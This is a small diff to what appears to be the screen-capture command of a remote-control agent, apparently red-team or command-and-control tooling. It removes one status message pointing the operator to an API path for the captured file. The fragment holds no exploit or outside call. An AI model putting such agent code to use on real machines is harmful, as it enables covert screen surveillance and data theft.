@@ -51,7 +51,6 @@ exports.screencapture = function(task, command, params){
             data = convert_to_nsdata(data);
         }
         var output = "Finished downloading file with id: " + registerFile['file_id'];
-        output += "\\nBrowse to /api/v1.0/files/" + registerFile['file_id'] + " and base64 decode it";
     }
     else{
        var output = "Failed to register file to download";
